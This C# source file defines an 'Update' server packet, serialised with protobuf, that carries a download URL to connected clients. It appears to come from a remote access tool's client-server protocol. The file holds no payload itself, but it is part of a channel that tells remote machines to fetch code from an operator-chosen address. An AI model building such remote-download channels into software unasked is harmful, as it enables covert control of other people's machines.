using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Update : IPacket
    {
        public Update()
        {
        }

        public Update(string downloadurl)
        {
            DownloadURL = downloadurl;
        }

        [ProtoMember(1)]
        public string DownloadURL { get; set; }

        public void Execute(Client client)
        {
            client.Send<Update>(this);
        }
    }
}